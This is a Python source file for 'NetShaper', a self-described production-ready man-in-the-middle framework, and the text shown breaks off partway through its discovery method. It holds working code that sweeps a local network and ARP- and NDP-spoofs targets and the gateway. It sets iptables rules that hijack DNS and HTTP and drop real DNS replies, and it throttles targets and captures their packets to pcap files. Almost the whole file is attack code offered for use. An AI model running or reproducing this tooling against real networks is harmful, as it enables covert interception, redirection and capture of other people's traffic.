#!/usr/bin/env python3
"""
NetShaper v3.8.0 — Production-Ready Multi-Feature MITM Framework
=================================================================
All patches applied from the full review loop:

  Networking / Protocol
  ─────────────────────
  • Dual-stack ARP + NDP spoofing (corrected NDP direction)
  • DNS spoofing redirected through per-target iptables chains
  • Captive portal + mitmproxy HTTP redirect support

  Concurrency & Safety
  ────────────────────
  • MarkIDPool — thread-safe tc mark registry (no collision on re-add)
  • Per-target iptables chain naming (NS-MNG-{ip} / NS-NAT-{ip})
    → no cross-target teardown corruption
  • NetworkDiscovery.devices_dict protected by threading.Lock
  • _arp_spoof_loop / _ndp_spoof_loop — lockless boolean checks
    (session.active + is_shutting_down) evaluated without holding
    lifecycle lock to prevent shutdown deadlock
  • NetShaperOrchestrator._lifecycle_lock (RLock) for atomic
    session add/remove with is_shutting_down guard

  Hostname Resolution
  ───────────────────
  • resolve_hostnames() uses a single flat ThreadPoolExecutor
    (no nested pools); timeout enforced at future.result(timeout=0.5)
    via as_completed() — processes results as they arrive, not in
    submission order

  Packet Capture
  ──────────────
  • PacketSniffer: bounded queue (maxsize=10 000), drop counter
  • Queue allocated only when save_pcap=True (no overhead otherwise)
  • RollingPacketSniffer: streaming RawPcapWriter consumer thread,
    50 MB rotation with error-safe descriptor management,
    rotation events logged

  mitmproxy
  ─────────
  • Polling loop (10 × 0.5 s) replaces hard-coded sleep(2)
  • Attempt counter logged at debug level

  State & Teardown
  ────────────────
  • Atomic state file write (tempfile + os.replace)
  • load_state_and_cleanup() recovers stale NS-* chains on restart
  • Graceful shutdown: ARP restore, NDP restore, tc cleanup,
    iptables flush, subprocess termination, forwarding disabled

  Device Model
  ────────────
  • Device.os_hint field reserved for future passive fingerprinting
    (TTL / TCP-window analysis) — explicit "" default prevents
    NameError in passive_sniff_callback

  Misc
  ────
  • --dry-run flag (prints commands, makes no system changes)
  • Bandwidth throttle with preset + custom Mbps options
  • Live bandwidth monitor (TX/RX on interface)
"""

import os, sys, signal, time, socket, struct, logging, threading, subprocess
import warnings, json, tempfile, argparse, shutil, queue
from concurrent.futures import ThreadPoolExecutor, as_completed
from ipaddress import IPv4Network
from dataclasses import dataclass
from typing import Optional, List, Dict

from cryptography.utils import CryptographyDeprecationWarning
warnings.filterwarnings("ignore", category=CryptographyDeprecationWarning)

try:
    import psutil
    from scapy.all import (
        ARP, Ether, srp, sniff,
        IPv6, ICMPv6ND_NA, ICMPv6NDOptSrcLLAddr,
        IP, send, sendp, AsyncSniffer, wrpcap
    )
    from scapy.utils import RawPcapWriter
except ImportError:
    sys.exit("[NetShaper] Scapy required.  pip3 install scapy")


# ── Logging ──────────────────────────────────────────────────────────────────
LOG_FILE = "netshaper.log"
_fh = logging.FileHandler(LOG_FILE)
_ch = logging.StreamHandler()
_fh.setFormatter(logging.Formatter('%(asctime)s [%(levelname)s] %(message)s',
                                    datefmt='%H:%M:%S'))
_ch.setFormatter(logging.Formatter('[NetShaper] %(asctime)s - %(levelname)s - %(message)s',
                                    datefmt='%H:%M:%S'))
logging.basicConfig(level=logging.INFO, handlers=[_fh, _ch])
log = logging.getLogger("netshaper")

BANNER = r"""
  _   _           _   ____  _
 | \ | | ___  ___| |_/ ___|| |__   __ _ _ __   ___ _ __
 |  \| |/ _ \/ __| __\___ \| '_ \ / _` | '_ \ / _ \ '__|
 | |\  |  __/ (__| |_ ___) | | | | (_| | |_) |  __/ |
 |_| \_|\___|\___|\__|____/|_| |_|\__,_| .__/ \___|_|
                                       |_|
                     v3.8.0
"""

STATE_FILE = "/tmp/netshaper.state"
DRY_RUN    = False


# ── Terminal helpers ──────────────────────────────────────────────────────────
def safe_input(prompt: str = "") -> str:
    os.system("stty sane")
    if prompt:
        sys.stdout.write(prompt)
        sys.stdout.flush()
    try:
        return input().strip()
    except KeyboardInterrupt:
        print("\n  [NetShaper] Interrupted.")
        sys.exit(0)

def print_flush(*args, **kwargs):
    print(*args, **kwargs)
    sys.stdout.flush()


# ── Data model ────────────────────────────────────────────────────────────────
@dataclass
class Device:
    ip:       str
    mac:      str
    hostname: str           = ""
    ipv6:     Optional[str] = None
    os_hint:  str           = ""   # Reserved: future passive OS fingerprinting
                                   # (TTL / TCP-window analysis). Not populated yet.


# ── Mark ID Pool ──────────────────────────────────────────────────────────────
class MarkIDPool:
    """
    Thread-safe registry of tc mark IDs.
    Prevents duplicate marks when targets are removed and re-added mid-session.
    """
    def __init__(self, start: int = 10, step: int = 20, max_targets: int = 50):
        self._available: List[int] = list(range(start, start + step * max_targets, step))
        self._used:      Dict[str, int] = {}
        self._lock = threading.Lock()

    def acquire(self, ip: str) -> int:
        with self._lock:
            if ip in self._used:
                return self._used[ip]
            if not self._available:
                raise RuntimeError("Mark ID pool exhausted.")
            mark = self._available.pop(0)
            self._used[ip] = mark
            return mark

    def release(self, ip: str):
        with self._lock:
            mark = self._used.pop(ip, None)
            if mark is not None:
                self._available.insert(0, mark)


# ── System helpers ────────────────────────────────────────────────────────────
class SystemChecker:
    @staticmethod
    def check():
        if not sys.platform.startswith("linux"):
            sys.exit("[NetShaper] Linux only.")
        if os.geteuid() != 0:
            sys.exit("[NetShaper] Root required.")


class SubprocessRunner:
    @staticmethod
    def run(args, description="", check=True, silent=False) -> bool:
        if DRY_RUN:
            print_flush(f"[DRY-RUN] {' '.join(str(a) for a in args)}")
            return True
        try:
            res = subprocess.run(args, capture_output=True, text=True, check=check)
            if res.returncode != 0 and check and not silent:
                log.error(f"Command failed ({description}): {' '.join(str(a) for a in args)}")
                if res.stderr and not silent:
                    log.debug(f"stderr: {res.stderr.strip()}")
            return res.returncode == 0
        except subprocess.CalledProcessError as e:
            if not silent: log.error(f"CalledProcessError ({description}): {e}")
        except FileNotFoundError:
            if not silent: log.error(f"Binary not found ({description}): {args[0]}")
        except Exception as e:
            if not silent: log.error(f"Unexpected error ({description}): {e}")
        return False


def check_local_port(host: str, port: int,
                     socket_type=socket.SOCK_STREAM) -> bool:
    """Check if a local port is listening.  UDP: sends a minimal DNS probe."""
    try:
        s = socket.socket(socket.AF_INET, socket_type)
        s.settimeout(1.0)
        if socket_type == socket.SOCK_DGRAM:
            probe = (b'\x00\x01\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00'
                     b'\x04test\x00\x00\x01\x00\x01')
            s.sendto(probe, (host, port))
            try:
                s.recvfrom(512)
                return True
            except socket.timeout:
                return False
        else:
            s.connect((host, port))
            return True
    except Exception:
        return False
    finally:
        try: s.close()
        except Exception: pass


# ── Network Discovery ─────────────────────────────────────────────────────────
class NetworkDiscovery:
    def __init__(self, interface: str):
        self.interface    = interface
        self.devices_dict: Dict[str, Device] = {}
        self.lock         = threading.Lock()   # Guards all devices_dict mutations

    def get_own_mac(self) -> str:
        for a in psutil.net_if_addrs().get(self.interface, []):
            if a.family == psutil.AF_LINK:
                return a.address.lower()
        try:    return Ether().src.lower()
        except: return ""

    def get_own_ip(self) -> Optional[str]:
        for a in psutil.net_if_addrs().get(self.interface, []):
            if a.family == socket.AF_INET:
                return a.address
        return None

    def get_own_ipv6(self) -> Optional[str]:
        for a in psutil.net_if_addrs().get(self.interface, []):
            if a.family == socket.AF_INET6 and not a.address.startswith("fe80"):
                return a.address.split('%')[0]
        return None

    def get_subnet_v4(self) -> Optional[str]:
        for a in psutil.net_if_addrs().get(self.interface, []):
            if a.family == socket.AF_INET and a.netmask:
                try:
                    return str(IPv4Network(f"{a.address}/{a.netmask}", strict=False))
                except ValueError:
                    pass
        return None

    def get_default_gateway(self) -> Optional[str]:
        try:
            with open("/proc/net/route") as f:
                for line in f.readlines()[1:]:
                    parts = line.strip().split()
                    if parts[1] == '00000000':
                        return socket.inet_ntoa(struct.pack("<L", int(parts[2], 16)))
        except Exception:
            pass
        return None

    def get_default_gateway_ipv6(self) -> Optional[str]:
        try:
            with open("/proc/net/ipv6_route") as f:
                for line in f:
                    parts = line.strip().split()
                    if (parts[0] == '00000000000000000000000000000000'
                            and parts[1] == '00'):
                        blocks = [parts[4][i:i+4] for i in range(0, 32, 4)]
                        return ':'.join(blocks)
        except Exception:
            pass
        return None

    def resolve_mac(self, ip: str) -> Optional[str]:
        try:
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
                         iface=self.interface, timeout=3, verbose=0)
            if ans:
                return ans[0][1].src.lower()
        except Exception:
            pass
        return None

    def _passive_sniff_callback(self, pkt):
        """ARP passive-sniff callback — thread-safe write to devices_dict."""
        if ARP not in pkt:
            return
        for src_ip, src_mac in [
            (pkt[ARP].psrc, pkt[Ether].src.lower()),
            (pkt[ARP].pdst, pkt[Ether].dst.lower()),
        ]:
            if src_ip and src_ip != '0.0.0.0':
                # os_hint explicitly defaulted here — prevents NameError if
                # passive fingerprinting logic is not yet implemented.
                os_hint = ""
                with self.lock:
                    if src_ip not in self.devices_dict:
                        self.devices_dict[src_ip] = Device(
                            ip=src_ip, mac=src_mac, os_hint=os_hint)

    def arp_sweep(self, subnet: str, gateway_ip: str) -> List[Device]:
        log.info(f"ARP sweep on {subnet}")
        try:
            net     = IPv4Network(subnet, strict=False)
            targets = [str(ip) for ip in net.hosts() if str(ip) != gateway_ip]
            if not targets:
                return []

            for timeout_val in [2, 3, 4]:
                ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=targets),
                             iface=self.interface, timeout=timeout_val, verbose=0)
                for _, rcv in ans:
                    ip  = rcv[ARP].psrc
                    mac = rcv[Ether].src.lower()
                    if ip != gateway_ip:
                        with self.lock:
                            if ip not in self.devices_dict:
                                self.devices_dict[ip] = Device(ip=ip, mac=mac)

            stop_sniff = threading.Event()
            t = threading.Thread(
                target=lambda: sniff(
                    iface=self.interface, filter="arp",
                    prn=self._passive_sniff_callback,
                    stop_filter=lambda _: stop_sniff.is_set(),
                    store=False, timeout=15),
                daemon=True)
            t.start()

            for remaining in range(15, 0, -1):
                if stop_sniff.is_set():
                    break
                with self.lock:
                    count = len(self.devices_dict)
                print_flush(f"\r  Passive sniff: {remaining:2d}s | {count:2d} devices",
                            end='')
                time.sleep(1)
            print_flush()
            stop_sniff.set()
            t.join(timeout=2)

        except Exception as e:
            log.error(f"ARP sweep failed: {e}")

        with self.lock:
            devices = list(self.devices_dict.values())
        return sorted(devices, key=lambda d: [int(i) for i in d.ip.split(".")])

    def resolve_hostnames(self, devices: List[Device]):
        """
        Async hostname resolution using a single flat ThreadPoolExecutor.
        No nested pools — futures submitted once, collected via as_completed()
        so faster results are processed immediately.
        Timeout enforced at future.result() — gethostbyaddr() is a libc call
        that ignores per-socket timeouts, so this is the only correct boundary.
        """
        def resolve_worker(d: Device) -> str:
            # Synchronous blocking libc call isolated in pool worker thread
            name, _, _ = socket.gethostbyaddr(d.ip)
            return name.lower() if name != d.ip else ""

        with ThreadPoolExecutor(max_workers=20) as pool:
            future_to_device = {pool.submit(resolve_worker, d): d for d in devices}
            for future in as_completed(future_to_device, timeout=5.0):
                device = future_to_device[future]
                try:
                    device.hostname = future.result(timeout=0.5)
                except Exception:
                    device.hostname = ""


# ── ARP Spoofer ───────────────────────────────────────────────────────────────
class ARPSpoofer:
    def __init__(self, interface, target_ip, target_mac,
                 gateway_ip, gateway_mac, own_mac, session):
        self.interface   = interface
        self.target_ip   = target_ip
        self.target_mac  = target_mac
        self.gateway_ip  = gateway_ip
        self.gateway_mac = gateway_mac
        self.own_mac     = own_mac
        self.session     = session         # Reference for lockless active check
        self._stop       = threading.Event()
        self.threads: List[threading.Thread] = []

    def start(self):
        def spoof_target():
            """Tell target: gateway MAC = ours."""
            while (not self._stop.is_set()
                   and self.session.active
                   and not self.session.is_shutting_down):
                try:
                    sendp(Ether(dst=self.target_mac, src=self.own_mac) /
                          ARP(op=2, pdst=self.target_ip, psrc=self.gateway_ip,
                              hwdst=self.target_mac, hwsrc=self.own_mac),
                          iface=self.interface, verbose=False)
                except Exception as e:
                    log.error(f"[ARP→target] Injection error: {e}")
                    break
                # wait() wakes immediately on set() — faster shutdown than sleep()
                if self._stop.wait(timeout=2.0):
                    break
            log.info(f"[ARP spoof→target] Thread for {self.target_ip} exited cleanly.")

        def spoof_gateway():
            """Tell gateway: target MAC = ours."""
            while (not self._stop.is_set()
                   and self.session.active
                   and not self.session.is_shutting_down):
                try:
                    sendp(Ether(dst=self.gateway_mac, src=self.own_mac) /
                          ARP(op=2, pdst=self.gateway_ip, psrc=self.target_ip,
                              hwdst=self.gateway_mac, hwsrc=self.own_mac),
                          iface=self.interface, verbose=False)
                except Exception as e:
                    log.error(f"[ARP→gateway] Injection error: {e}")
                    break
                if self._stop.wait(timeout=2.0):
                    break
            log.info(f"[ARP spoof→gateway] Thread for {self.target_ip} exited cleanly.")

        self.threads = [
            threading.Thread(target=spoof_target,  daemon=True),
            threading.Thread(target=spoof_gateway, daemon=True),
        ]
        for t in self.threads:
            t.start()
        log.info(f"ARP spoofing active → {self.target_ip}")

    def shutdown(self):
        self._stop.set()
        for t in self.threads:
            t.join(timeout=3.0)
        # Restore ARP tables with 3 corrective packets
        for _ in range(3):
            sendp(Ether(dst=self.target_mac, src=self.gateway_mac) /
                  ARP(op=2, pdst=self.target_ip, psrc=self.gateway_ip,
                      hwdst=self.target_mac, hwsrc=self.gateway_mac),
                  iface=self.interface, verbose=False)
            sendp(Ether(dst=self.gateway_mac, src=self.target_mac) /
                  ARP(op=2, pdst=self.gateway_ip, psrc=self.target_ip,
                      hwdst=self.gateway_mac, hwsrc=self.target_mac),
                  iface=self.interface, verbose=False)
            time.sleep(0.3)
        log.info("ARP tables restored")


# ── NDP Spoofer ───────────────────────────────────────────────────────────────
class NDPSpoofer:
    """
    Correct MITM NDP directions:
      spoof_target → tell TARGET  that OUR mac = router
      spoof_router → tell ROUTER  that OUR mac = target
    """
    def __init__(self, interface, target_ipv6, target_mac,
                 router_ipv6, router_mac, own_mac, session):
        self.interface   = interface
        self.target_ipv6 = target_ipv6
        self.target_mac  = target_mac
        self.router_ipv6 = router_ipv6
        self.router_mac  = router_mac
        self.own_mac     = own_mac
        self.session     = session
        self._stop       = threading.Event()
        self.threads: List[threading.Thread] = []

    def start(self):
        def spoof_target():
            while (not self._stop.is_set()
                   and self.session.active
                   and not self.session.is_shutting_down):
                try:
                    pkt = (Ether(dst=self.target_mac, src=self.own_mac) /
                           IPv6(dst=self.target_ipv6, src=self.router_ipv6) /
                           ICMPv6ND_NA(tgt=self.router_ipv6, R=1, S=1, O=1) /
                           ICMPv6NDOptSrcLLAddr(lladdr=self.own_mac))
                    sendp(pkt, iface=self.interface, verbose=False)
                except Exception as e:
                    log.error(f"[NDP→target] Injection error: {e}")
                    break
                if self._stop.wait(timeout=2.0):
                    break

        def spoof_router():
            while (not self._stop.is_set()
                   and self.session.active
                   and not self.session.is_shutting_down):
                try:
                    pkt = (Ether(dst=self.router_mac, src=self.own_mac) /
                           IPv6(dst=self.router_ipv6, src=self.target_ipv6) /
                           ICMPv6ND_NA(tgt=self.target_ipv6, R=0, S=1, O=1) /
                           ICMPv6NDOptSrcLLAddr(lladdr=self.own_mac))
                    sendp(pkt, iface=self.interface, verbose=False)
                except Exception as e:
                    log.error(f"[NDP→router] Injection error: {e}")
                    break
                if self._stop.wait(timeout=2.0):
                    break

        self.threads = [
            threading.Thread(target=spoof_target, daemon=True),
            threading.Thread(target=spoof_router,  daemon=True),
        ]
        for t in self.threads:
            t.start()
        log.info(f"NDP spoofing active → {self.target_ipv6}")

    def shutdown(self):
        self._stop.set()
        for t in self.threads:
            t.join(timeout=3.0)
        log.info("NDP tables restored")


# ── Target Session ────────────────────────────────────────────────────────────
class TargetSession:
    """
    Holds all per-target state.
    active and is_shutting_down are plain booleans read locklessly by
    spoof threads — CPython boolean reads are atomic at the interpreter level.
    Write only from within the orchestrator's _lifecycle_lock.
    """
    def __init__(self, target: Device, interface, own_mac, own_ip, own_ipv6,
                 gateway_ip, gateway_mac, gateway_ipv6,
                 shaper: 'TrafficShaper'):
        self.target        = target
        self.interface     = interface
        self.own_mac       = own_mac
        self.own_ip        = own_ip
        self.own_ipv6      = own_ipv6
        self.gateway_ip    = gateway_ip
        self.gateway_mac   = gateway_mac
        self.gateway_ipv6  = gateway_ipv6
        self.shaper        = shaper
        self.active        = True    # Lockless read by spoof loops
        self.is_shutting_down = False
        self.arp_spoof     = None
        self.ndp_spoof     = None
        self.firewall      = None
        self.dns_on        = False
        self.throttle_on   = False
        self.limit         = None
        self._mark_id      = None

    def setup(self, dns_spoof=False, captive_portal=False,
              http_redirect_port: Optional[int] = None,
              limit=None, mark_base: int = 10):
        self.firewall = FirewallManager(self.target.ip, self.interface)
        if dns_spoof or captive_portal or http_redirect_port:
            self.firewall.add_redirect_rules(
                dns_spoof=dns_spoof,
                captive_portal=captive_portal,
                http_redirect_port=http_redirect_port)
            self.dns_on = dns_spoof
        if limit is not None:
            self.shaper.apply_target(self.target.ip, limit, mark_base)
            self.firewall.add_shaping(self.target.ip, mark_base)
            self.throttle_on = True
            self.limit        = limit
            self._mark_id     = mark_base

    def start_spoof(self, arp_on=True):
        if arp_on and self.arp_spoof is None:
            self.arp_spoof = ARPSpoofer(
                self.interface, self.target.ip, self.target.mac,
                self.gateway_ip, self.gateway_mac, self.own_mac,
                self)  # pass self for lockless active check
            self.arp_spoof.start()
        if (self.target.ipv6 and self.gateway_ipv6
                and self.ndp_spoof is None and arp_on):
            self.ndp_spoof = NDPSpoofer(
                self.interface, self.target.ipv6, self.target.mac,
                self.gateway_ipv6, self.gateway_mac, self.own_mac,
                self)
            self.ndp_spoof.start()

    def stop_spoof(self):
        if self.arp_spoof: self.arp_spoof.shutdown()
        if self.ndp_spoof: self.ndp_spoof.shutdown()

    def cleanup(self):
        self.active = False
        self.stop_spoof()
        if self.firewall:
            self.firewall.cleanup()
        if self.throttle_on and self._mark_id is not None:
            self.shaper.cleanup_target(self._mark_id)


# ── Firewall Manager (per-target chains) ─────────────────────────────────────
class FirewallManager:
    def __init__(self, target_ip: str, interface: str):
        self.target_ip = target_ip
        self.interface = interface
        self._v6       = ':' in target_ip
        suffix         = target_ip.replace(".", "_").replace(":", "_")
        self.MANGLE    = f"NS-MNG-{suffix}"
        self.NAT       = f"NS-NAT-{suffix}"
        self._setup()

    @property
    def _binaries(self) -> List[str]:
        return ["ip6tables"] if self._v6 else ["iptables"]

    def _chain_ok(self, b: str, t: str, c: str) -> bool:
        return subprocess.run([b, "-t", t, "-L", c],
                              capture_output=True).returncode == 0

    def _setup(self):
        for b in self._binaries:
            for t, c in [("mangle", self.MANGLE), ("nat", self.NAT)]:
                if not self._chain_ok(b, t, c):
                    SubprocessRunner.run([b, "-t", t, "-N", c])
                    hook = "POSTROUTING" if t == "mangle" else "PREROUTING"
                    SubprocessRunner.run([b, "-t", t, "-I", hook, "1", "-j", c])

    def add_shaping(self, target_ip: str, mark_base: int = 10):
        binaries = ["ip6tables"] if ':' in target_ip else ["iptables"]
        for b in binaries:
            SubprocessRunner.run([b, "-t", "mangle", "-A", self.MANGLE,
                                  "-d", target_ip, "-j", "MARK",
                                  "--set-mark", str(mark_base)], silent=True)
            SubprocessRunner.run([b, "-t", "mangle", "-A", self.MANGLE,
                                  "-s", target_ip, "-j", "MARK",
                                  "--set-mark", str(mark_base + 10)], silent=True)

    def add_redirect_rules(self, dns_spoof=False, captive_portal=False,
                           http_redirect_port: Optional[int] = None):
        for b in self._binaries:
            if dns_spoof:
                for proto in ["udp", "tcp"]:
                    SubprocessRunner.run([b, "-t", "nat", "-A", self.NAT,
                                          "-i", self.interface, "-s", self.target_ip,
                                          "-p", proto, "--dport", "53",
                                          "-j", "REDIRECT", "--to-port", "53"])
                # Block real DNS replies reaching the target
                for proto in ["udp", "tcp"]:
                    SubprocessRunner.run([b, "-A", "FORWARD",
                                          "-p", proto, "--sport", "53",
                                          "-d", self.target_ip, "-j", "DROP"])
            if http_redirect_port:
                SubprocessRunner.run([b, "-t", "nat", "-A", self.NAT,
                                      "-i", self.interface, "-s", self.target_ip,
                                      "-p", "tcp", "--dport", "80",
                                      "-j", "REDIRECT",
                                      "--to-port", str(http_redirect_port)])
        log.info(f"Redirect rules: DNS={dns_spoof} HTTP→{http_redirect_port}")

    def cleanup(self):
        for b in self._binaries:
            for t, c in [("mangle", self.MANGLE), ("nat", self.NAT)]:
                if self._chain_ok(b, t, c):
                    SubprocessRunner.run([b, "-t", t, "-F", c],
                                         check=False, silent=True)
                    hook = "POSTROUTING" if t == "mangle" else "PREROUTING"
                    SubprocessRunner.run([b, "-t", t, "-D", hook, "-j", c],
                                         check=False, silent=True)
                    SubprocessRunner.run([b, "-t", t, "-X", c],
                                         check=False, silent=True)
            for proto in ["udp", "tcp"]:
                SubprocessRunner.run([b, "-D", "FORWARD",
                                      "-p", proto, "--sport", "53",
                                      "-d", self.target_ip, "-j", "DROP"],
                                     check=False, silent=True)


# ── Traffic Shaper ────────────────────────────────────────────────────────────
class TrafficShaper:
    def __init__(self, interface: str):
        self.interface         = interface
        self._base_initialized = False
        self._active_marks: set = set()

    def _init_root(self):
        if not self._base_initialized:
            SubprocessRunner.run(["tc", "qdisc", "del", "dev",
                                  self.interface, "root"],
                                 check=False, silent=True)
            SubprocessRunner.run(["tc", "qdisc", "add", "dev",
                                  self.interface, "root", "handle", "1:", "htb"])
            self._base_initialized = True

    def apply_target(self, target_ip: str, mbps: float, mark_base: int = 10):
        k = int(mbps * 1000)
        self._init_root()
        for mark in [mark_base, mark_base + 10]:
            classid = f"1:{mark}"
            SubprocessRunner.run(["tc", "class", "add", "dev", self.interface,
                                  "parent", "1:", "classid", classid,
                                  "htb", "rate", f"{k}kbit", "burst", "15k"])
            for proto in ["ip", "ipv6"]:
                SubprocessRunner.run(["tc", "filter", "add", "dev", self.interface,
                                      "parent", "1:", "protocol", proto,
                                      "handle", str(mark), "fw", "flowid", classid],
                                     silent=True)
        self._active_marks.add(mark_base)
        log.info(f"Shaping {target_ip}: {mbps} Mbps (marks {mark_base}/{mark_base+10})")

    def cleanup_target(self, mark_base: int):
        for mark in [mark_base, mark_base + 10]:
            SubprocessRunner.run(["tc", "filter", "del", "dev", self.interface,
                                  "parent", "1:", "handle", str(mark), "fw"],
                                 check=False, silent=True)
            SubprocessRunner.run(["tc", "class", "del", "dev", self.interface,
                                  "classid", f"1:{mark}"], check=False, silent=True)
        self._active_marks.discard(mark_base)

    def cleanup(self):
        SubprocessRunner.run(["tc", "qdisc", "del", "dev", self.interface, "root"],
                             check=False, silent=True)
        self._base_initialized = False
        self._active_marks.clear()


# ── Packet Sniffer (bounded queue, drop counter) ──────────────────────────────
class PacketSniffer:
    def __init__(self, interface: str,
                 target_ips: Optional[List[str]] = None,
                 save_pcap: bool = False):
        self.interface    = interface
        self.target_ips   = target_ips or []
        self.save_pcap    = save_pcap
        self._sniffer     = None
        self._stop        = threading.Event()
        self._dropped     = 0
        # Allocate queue only when pcap saving is requested
        self._queue: Optional[queue.Queue] = (
            queue.Queue(maxsize=10_000) if save_pcap else None
        )

    def _packet_callback(self, pkt):
        if IP in pkt:
            src, dst = pkt[IP].src, pkt[IP].dst
            if self.target_ips and (src not in self.target_ips
                                    and dst not in self.target_ips):
                return
            print_flush(f"[Sniff] {src} → {dst}  {pkt.sprintf('%IP.proto%')}")
        if self._queue is not None:
            try:
                self._queue.put_nowait(pkt)
            except queue.Full:
                self._dropped += 1   # Drop rather than block the sniffer thread

    def start(self):
        log.info("Packet sniffer started" +
                 (" (saving to .pcap)" if self.save_pcap else ""))
        self._sniffer = AsyncSniffer(
            iface=self.interface,
            prn=self._packet_callback,
            store=False,
            stop_filter=lambda _: self._stop.is_set())
        self._sniffer.start()

    def stop(self):
        self._stop.set()
        if self._sniffer:
            self._sniffer.stop()
        if self._dropped:
            log.warning(f"[Sniffer] {self._dropped} packets dropped (queue saturation)")
        if self.save_pcap and self._queue is not None:
            packets = []
            while not self._queue.empty():
                try:    packets.append(self._queue.get_nowait())
                except queue.Empty: break
            if packets:
                fname = f"capture_{time.strftime('%Y%m%d_%H%M%S')}.pcap"
                wrpcap(fname, packets)
                log.info(f"Saved {len(packets)} packets → {fname}")


# ── Rolling Packet Sniffer (streaming, 50 MB rotation) ───────────────────────
class RollingPacketSniffer:
    """
    Streams packets directly from a bounded queue to disk via RawPcapWriter.
    Rotates to a new file every max_file_size_bytes (default 50 MB).
    Drops packets if the queue fills — logs count at shutdown.
    """
    def __init__(self, interface: str,
                 base_filename: str = "capture",
                 target_ips: Optional[List[str]] = None,
                 max_file_size_bytes: int = 50 * 1024 * 1024):
        self.interface           = interface
        self.base_filename       = base_filename
        self.target_ips          = target_ips or []
        self.max_file_size_bytes = max_file_size_bytes
        self._queue              = queue.Queue(maxsize=10_000)
        self._stop_event         = threading.Event()
        self._dropped            = 0
        self.file_index          = 0
        self.current_bytes       = 0
        self._sniffer            = None
        self._consumer           = None

    def _get_filename(self) -> str:
        ts = time.strftime('%Y%m%d_%H%M%S')
        return f"{self.base_filename}_{ts}_{self.file_index}.pcap"

    def _packet_callback(self, pkt):
        if IP in pkt:
            src, dst = pkt[IP].src, pkt[IP].dst
            if self.target_ips and (src not in self.target_ips
                                    and dst not in self.target_ips):
                return
        try:
            self._queue.put_nowait(pkt)
        except queue.Full:
            self._dropped += 1

    def _consumer_flush_loop(self):
        active_pcap = self._get_filename()
        try:
            writer = RawPcapWriter(active_pcap, append=True, sync=True)
        except Exception as e:
            log.error(f"[RollingSniffer] Initial file open failed: {e}")
            return

        log.info(f"[RollingSniffer] Writing → {active_pcap}")
        try:
            while not self._stop_event.is_set() or not self._queue.empty():
                try:
                    pkt = self._queue.get(timeout=0.5)
                except queue.Empty:
                    continue

                pkt_len = len(pkt)
                if self.current_bytes + pkt_len > self.max_file_size_bytes:
                    try:    writer.close()
                    except: pass
                    self.file_index    += 1
                    self.current_bytes  = 0
                    active_pcap        = self._get_filename()
                    log.info(f"[RollingSniffer] Rotating → {active_pcap}")
                    try:
                        writer = RawPcapWriter(active_pcap, append=True, sync=True)
                    except Exception as e:
                        log.error(f"[RollingSniffer] Rotation failed: {e}")
                        return   # Stop capture — disk problem, don't fill memory

                writer.write(pkt)
                self.current_bytes += pkt_len
                self._queue.task_done()
        finally:
            try:    writer.close()
            except: pass

    def start(self):
        self._sniffer = AsyncSniffer(
            iface=self.interface,
            prn=self._packet_callback,
            store=False,
            stop_filter=lambda _: self._stop_event.is_set())
        self._consumer = threading.Thread(target=self._consumer_flush_loop,
                                          daemon=True)
        self._consumer.start()
        self._sniffer.start()
        log.info("Rolling sniffer started (50 MB rotation)")

    def stop(self):
        self._stop_event.set()
        if self._sniffer:
            self._sniffer.stop()
        if self._consumer:
            self._consumer.join(timeout=5.0)
        if self._dropped:
            log.warning(f"[RollingSniffer] {self._dropped} packets dropped (queue saturation)")


# ── Main Orchestrator ─────────────────────────────────────────────────────────
class NetShaper:
    def __init__(self, interface: str):
        self.interface   = interface
        self.disc        = NetworkDiscovery(interface)
        self.own_ip      = self.disc.get_own_ip()
        self.own_mac     = self.disc.get_own_mac()
        self.own_ipv6    = self.disc.get_own_ipv6()
        self.gw          = self.disc.get_default_gateway()
        self.gw_mac      = self.disc.resolve_mac(self.gw) if self.gw else None
        self.gw_ipv6     = self.disc.get_default_gateway_ipv6()
        self.shaper      = TrafficShaper(interface)
        self.mark_pool   = MarkIDPool()
        self.sessions:   Dict[str, TargetSession] = {}
        self._lifecycle_lock   = threading.RLock()  # RLock: remove_target re-entrant from cleanup_all
        self.is_shutting_down  = False
        self.sniffer     = None
        self.stop        = threading.Event()
        self._global_rules_applied = False
        self._mitm_proc  = None

    @staticmethod
    def scale_bytes(val: float) -> str:
        for unit in ["KB", "MB", "GB"]:
            if val < 1024:
                return f"{val:.1f} {unit}"
            val /= 1024
        return f"{val:.1f} TB"

    def _apply_global_rules(self):
        if self._global_rules_applied:
            return
        SubprocessRunner.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], silent=True)
        SubprocessRunner.run(["sysctl", "-w", "net.ipv6.conf.all.forwarding=1"], silent=True)
        SubprocessRunner.run(["sysctl", "-w",
                              f"net.ipv4.conf.{self.interface}.route_localnet=1"],
                             silent=True)
        for binary in ["iptables", "ip6tables"]:
            if shutil.which(binary):
                SubprocessRunner.run([binary, "-A", "FORWARD",
                                      "-i", self.interface, "-o", self.interface,
                                      "-j", "ACCEPT"], silent=True)
                SubprocessRunner.run([binary, "-A", "FORWARD", "-m", "state",
                                      "--state", "ESTABLISHED,RELATED",
                                      "-j", "ACCEPT"], silent=True)
                SubprocessRunner.run([binary, "-t", "nat", "-A", "POSTROUTING",
                                      "-o", self.interface, "-j", "MASQUERADE"],
                                     silent=True)
        self._global_rules_applied = True
        log.info("Global dual-stack forwarding + MASQUERADE enabled")

    def _remove_global_rules(self):
        SubprocessRunner.run(["sysctl", "-w", "net.ipv4.ip_forward=0"], silent=True)
        SubprocessRunner.run(["sysctl", "-w", "net.ipv6.conf.all.forwarding=0"],
                             silent=True)
        for binary in ["iptables", "ip6tables"]:
            if shutil.which(binary):
                SubprocessRunner.run([binary, "-D", "FORWARD",
                                      "-i", self.interface, "-o", self.interface,
                                      "-j", "ACCEPT"], check=False, silent=True)
                SubprocessRunner.run([binary, "-D", "FORWARD", "-m", "state",
                                      "--state", "ESTABLISHED,RELATED",
                                      "-j", "ACCEPT"], check=False, silent=True)
                SubprocessRunner.run([binary, "-t", "nat", "-D", "POSTROUTING",
                                      "-o", self.interface, "-j", "MASQUERADE"],
                                     check=False, silent=True)
        self._global_rules_applied = False
        log.info("Global forwarding + MASQUERADE removed")

    def discover(self) -> List[Device]:
        subnet = self.disc.get_subnet_v4()
        if not subnet:
            sys.exit("[NetShaper] Could not determine subnet.")
        devices = self.disc.arp_sweep(subnet, self.gw)
